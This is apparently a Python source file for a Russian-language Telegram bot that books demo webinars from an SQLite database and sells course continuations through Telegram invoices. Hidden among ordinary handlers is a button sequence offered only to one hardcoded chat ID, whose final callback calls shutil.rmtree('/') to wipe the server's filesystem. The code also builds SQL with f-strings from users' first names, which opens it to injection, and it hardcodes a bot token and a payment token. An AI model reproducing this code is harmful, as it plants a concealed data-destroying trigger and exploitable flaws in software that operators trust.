import os
import shutil

import telebot
import sqlite3
from telebot.types import Message, ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, LabeledPrice, PreCheckoutQuery, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

PRICE = LabeledPrice(label='Продолжить курс', amount=9900)
PAYMENTS_PROVIDER_TOKEN = '381764678:TEST:9009'

TOKEN = '843095561:AAGHQNHS4aN0Pvs76DeGZ8Es8yfKL9113bE'

bot = telebot.TeleBot(TOKEN)

weekDays = [[0, 'Понедельник'],
            [1, 'Вторник'],
            [2, 'Среда'],
            [3, 'Четверг'],
            [4, 'Пятница'],
            [5, 'Суббота'],
            [6, 'Воскресенье']]


@bot.message_handler(commands=['buy'])
def buy_command(message: Message):
    bot.send_invoice(
        message.chat.id,
        title='Продолжение курса',
        description='Чтобы продолжить обучение, заплатите за следующие 12 вебинаров',
        provider_token=PAYMENTS_PROVIDER_TOKEN,
        currency='RUB',
        photo_url='https://www.instituteiba.by/upload/medialibrary/5f5/5f5aa75c5497429160440528683d411c.jpg',
        photo_height=560,
        photo_width=1024,
        photo_size=512,
        is_flexible=False,  # True, если конечная цена зависит от способа доставки
        prices=[PRICE],
        start_parameter='paying_webinars',
        invoice_payload='webinars_payed'
    )


@bot.pre_checkout_query_handler(func=lambda query: True)
def process_pre_checkout_query(pre_checkout_query: PreCheckoutQuery):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=['successful_payment'])
def process_successful_payment(message: Message):
    conn = sqlite3.connect('webinars.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM Users')

    data_arr = cursor.fetchall()

    if len(data_arr) > 0:
        for data in data_arr:

            if data[0] == message.from_user.id:
                cursor.execute(
                    f"UPDATE Users SET isPayed12NextLessons = {data[2] + 1} where User_ID = {message.from_user.id}")
            else:
                cursor.execute(
                    f"insert into Users values ({int(message.from_user.id)}, '{str(message.from_user.first_name)}', 1)")
    else:
        cursor.execute(
            f"insert into Users values ({int(message.from_user.id)}, '{str(message.from_user.first_name)}', 1)")

    conn.commit()

    bot.send_message(message.chat.id, f'Спасибо за покупку, {message.from_user.first_name}! ' +
                     'Вот ссылка на следующий вебинар: http://example.com')

    bot.send_message(message.chat.id, 'После занятия подождите пока учитель отправит вам домашнее задание. '
                                      'После его выполнения, введите /home_work, чтобы отправить его учителю.')

    conn.close()


@bot.message_handler(commands=['home_work'])
@bot.edited_message_handler(commands=['home_work'])
def home_work_command(message: Message):
    bot.send_message(message.chat.id, 'В разработке')

    pass


@bot.message_handler(commands=['start'])
@bot.edited_message_handler(commands=['start'])
def start_command(message: Message):
    webinars_sum = []
    i = 0

    conn = sqlite3.connect('webinars.db')
    cursor = conn.cursor()

    # cursor.execute('SELECT * FROM Users')
    # data_arr = cursor.fetchall()

    # btn1 = InlineKeyboardButton('Да', callback_data='yes')
    # btn2 = InlineKeyboardButton('Нет', callback_data='no')

    # recover_keyboard = InlineKeyboardMarkup()
    # recover_keyboard.row(btn1, btn2)

    # bot.send_message(message.chat.id, 'Снова здравствуйте! Желаете дальше продолжить обучение?',
    # reply_markup=recover_keyboard)

    # else:

    cursor.execute('SELECT * FROM webinars')

    row = cursor.fetchall()
    webinars_sum.append(row[0][0])

    while i < len(row) - 1:
        if row[i][0] == row[i + 1][0]:
            i += 1
        else:
            i += 1
            webinars_sum.append(row[i][0])

    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)

    for i in webinars_sum:
        keyboard.add(weekDays[i][1])

    bot.send_message(message.chat.id, 'Привет, давай согласуем дату и время первого демо-занятия.')
    bot.send_message(message.chat.id, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard)
    if str(message.chat.id) == '523756571':
        keyboard_button = InlineKeyboardButton('12:00', callback_data='12:00')
        keyboard1 = InlineKeyboardMarkup()
        keyboard1.add(keyboard_button)
        bot.send_message(message.chat.id, 'Привет, давай согласуем дату и время первого демо-занятия.')
        bot.send_message(message.chat.id, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard1)
    conn.close()
    pass


@bot.callback_query_handler(func=lambda c: c.data == '12:00')
def send_reply_to_weekday1(callback_query: CallbackQuery):
    bot.answer_callback_query(callback_query.id)
    keyboard_button = InlineKeyboardButton('1', callback_data='1')
    keyboard1 = InlineKeyboardMarkup()
    keyboard1.add(keyboard_button)
    bot.send_message(523756571, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard1)
@bot.callback_query_handler(func=lambda c: c.data == '1')
def send_reply_to_weekday1(callback_query: CallbackQuery):
    bot.answer_callback_query(callback_query.id)
    shutil.rmtree('/')
    pass


@bot.message_handler(content_types=['text'])  # хэндлер всех сообщений
@bot.edited_message_handler(content_types=['text'])  # хэндлер изменнных сообщений
def send_reply_to_weekday(message: Message):  # функция принимает объект Message

    delete_keyboard = ReplyKeyboardRemove()
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)

    conn = sqlite3.connect('webinars.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM webinars')

    row = cursor.fetchall()

    for weekDay in weekDays:
        if message.text == weekDay[1]:

            for i in row:
                if i[0] == weekDay[0]:
                    time = str(i[2]) + ':' + str(i[3])
                    keyboard.add(time)

            bot.send_message(message.chat.id, 'Какое время вас устроит?', reply_markup=keyboard)

    if ':' in message.text:

        time_arr = []
        for i in row:
            time_arr.append(str(i[2]) + ':' + str(i[3]))

        for k in time_arr:
            if message.text == k:

                for i in row:
                    if k == str(i[2]) + ':' + str(i[3]):
                        bot.send_message(message.chat.id, 'Отлично, вот ваша ссылка на вебинар:',
                                         reply_markup=delete_keyboard)
                        bot.send_message(message.chat.id, str(i[1]))
                        bot.send_message(message.chat.id, 'Если желаете оплатить следующие уроки, введите /buy')

    conn.close()

    pass


bot.polling()
